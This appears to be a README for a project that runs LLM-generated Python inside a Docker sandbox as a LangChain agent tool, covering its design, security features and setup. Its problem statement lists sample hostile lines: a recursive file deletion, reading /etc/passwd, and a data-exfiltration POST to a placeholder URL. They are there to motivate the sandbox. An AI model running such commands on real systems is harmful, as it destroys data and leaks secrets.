# Python Code Interpreter with Docker Sandbox for use with LangChain Agents

We demonstrate how to construct a docker based Python code interpreter that can be used as a Langchain Agent Tool for controlled and secure execution of LLM generated Python code. 

## Table of Contents
- [Problem Statement](#problem-statement)
- [Existing Solutions and Limitations](#existing-solutions-and-limitations)
- [Solution Approach](#solution-approach-in-this-repo)
- [Technical Details](#technical-details)
  - [Input/Output Schema](#inputoutput-schema)
  - [Tool Integration with LangChain](#tool-integration-with-langchain)
  - [Security Features](#security-features)
- [Lessons Learned](#lessons-learned)
  - [Error Handling Simplicity](#error-handling-simplicity)
  - [LLM Behavior Insights](#llm-behavior-insights)
  - [Sandbox Design Decisions](#sandbox-design-decisions)
- [Technologies Used](#technologies-used)
- [Setup](#setup)
- [License](#license)
- [Disclaimer](#disclaimer)
- [About the Author](#about-the-author)

## Problem Statement

Langchain's experimental hub contains the `PythonREPLTool` tool which can be used to locally execute LLM-generated Python code. However, when using this tool, we face potential security risks from arbitrary code execution since the LLM could potentially generate harmful code such as 

```python
# Potentially harmful operations
os.system('rm -rf *')  # Delete files
open('/etc/passwd').read()  # Access sensitive files
requests.post('malicious-url', data=sensitive_data)  # Data exfiltration
while True: pass  # Resource exhaustion
```
and hence is it unsafe to run any LLM generated code directly on the host machine without a suitable sandboxing mechanism. 

## Existing Solutions and Limitations

[Cohere-Terrarium](https://github.com/cohere-ai/cohere-terrarium/tree/main) is a very interesting solution that provides a sandboxed environment for running LLM generated Python code. Based on the Pyodide project, it allows running Python code to be run locally or in the cloud within the WASM interpreter. However, the primary limitation of this approach is that it is restricted to Pyodide-compatible [packages](https://pyodide.org/en/stable/usage/packages-in-pyodide.html). If the LLM generates code that requires a package which is not compatible with Pyodide, the code cannot be executed. (Note that Pyodide contains micropip, so in theory one could potentially let the python app code to  first use micropip to install the missing package, but there are several challenges here; for example; the LLM needs to be carefully prompted to Pyrodide-compatible packages and installation of missing packages;  I did some preliminary investigation on this and found this challenging.)


## Solution Approach in this Repo:

Instead of trying to secure Python first with WASM, and then with Docker like Cohere Terrarium does, the solution here is just to protect the Python environment with Docker. This way, even if the LLM generates malicious code, it can only "break" the container, not our system.

Here's how it works:
1. When the LLM generates Python code, we don't run it directly
2. Instead, we send it to a Flask server running in a Docker container
3. The Flask server runs a separate subprocess for every code execution request, thus ensuring that the code execution is isolated from any other code execution requests.
4. Any files created are stored in a special `/workspace` directory within the container.
5. Results (including any generated files) are sent back safely. Note that we use Base64 encoding to send the results/files back to the client, without having to mount the workspace directory to the client host.
6. Finally, the LangChain agent takes the results and decides what to do next. As far as the agent is concerned, it's just a Python Shell available as an external Tool, and runs and returns results as if it was a normal Python shell. 

## Technical Details

### Input/Output Schema

The Docker sandbox uses a simple but effective API schema:

1. **Input**:
   ```python
   {
       'code': str  # Python code to execute
   }
   ```
   The code string is sent to the Flask server running in the Docker container. The output schema from the Flask server is as follows:

2. **Output**:
   ```python
   {
       'success': bool,      # Execution status
       'output': str,        # stdout/stderr content
       'error': Optional[str],  # Error message if any
       'files': Optional[Dict[str, bytes]]  # Base64 encoded files
   }
   ```
The client.py file contains the code to parse the Flask server's response and return the code execution result back to the LangChain agent.


### Tool Integration with LangChain

The sandbox is exposed to LangChain as a Tool:
```python
Tool(
    name="python_code_interpreter",
    func=run_python_code,
    description="""A Python shell. Use this to execute python commands. 
    Input should be a valid python command. 
    If you want to see the output of a value, you should print it out with `print(...)`.
    Always save files to '/workspace/' directory."""
)
```

### Security Features

1. **Process Isolation**:
   - Each code execution runs in a separate subprocess
   - Resource limits enforced by Docker
   - Clean environment for each run

2. **File System Safety**:
   - Restricted to `/workspace` directory
   - Files transferred via Base64 encoding
   - No volume mounts needed
   - Fresh workspace for each execution

3. **Network Control**:
   - Container-level network restrictions
   - Configurable package access
   - No direct host network access

4. **Package Management**:
   - Python packages must be pre-installed via Dockerfile
   - No runtime package installation allowed (security measure)
   - Example Dockerfile entry:
     ```dockerfile
     RUN pip install numpy pandas matplotlib seaborn scikit-learn
     ```
   - New packages require container rebuild

## Lessons Learned

1. **Error Handling Simplicity**:
   When it comes to error handling, simpler is better! Initially, I tried to be clever with custom error messages and complex error handling, but then we found that:
   ```python
   agent_executor = AgentExecutor(
       agent=agent, 
       tools=tools, 
       verbose=True,
       handle_parsing_errors=True  # This is the magic!
   )
   ```
   Just setting `handle_parsing_errors=True` and letting the raw stderr flow back to the LLM works amazingly well. Why? Because:
   - The LLM understands Python errors naturally
   - No need for custom error messages
   - The LLM can debug based on the actual error output
   - Prevents error handling loops

2. **LLM Behavior Insights**:
   - Models can be overly cautious (e.g., refusing to write to `/etc` without trying)
   - Clear tool descriptions improve code generation
   - Simple prompts work better than complex error handling instructions

3. **Sandbox Design Decisions**:
One of the trickiest parts of our Docker sandbox was figuring out how to get files in and out without mounting volumes (which could be a security risk). The solution used here is follows:
- When the Python code in the container creates a file (like a QR code or plot), we:
  - Read the file into memory
  - Convert it to base64
- Send it back as part of the API response. This solution for file transfer eliminates need for volume mounts:
  
  
## Technologies Used
- Python 3.xx
- Docker
- Flask
- LangChain
- OpenAI GPT models
- Base64 encoding

## Setup

1. Install dependencies:
```bash
pip install -r requirements.txt
```

2. Build and run Docker container:
```bash
cd python/tools/docker_python_sandbox
docker build -t python-sandbox .
docker run -p 5000:5000 python-sandbox
```

3. Set up environment variables:
```bash
export OPENAI_API_KEY=your_api_key
```

4. Run the application:
```bash
python python/main.py
```

## License
This project is licensed under the Apache License, Version 2.0 (APL 2.0).


## Disclaimer
No security solution is perfect. The code in this repo is provided as-is and without any guarantees. Always:
- Run in isolated environments
- Review LLM generated code, whenever possible
- Monitor execution
- Keep security measures updated


## About the Author
This repo was created by [Prakash Narayana Moorthy](https://www.linkedin.com/in/prakash-narayana-moorthy-522021b3/).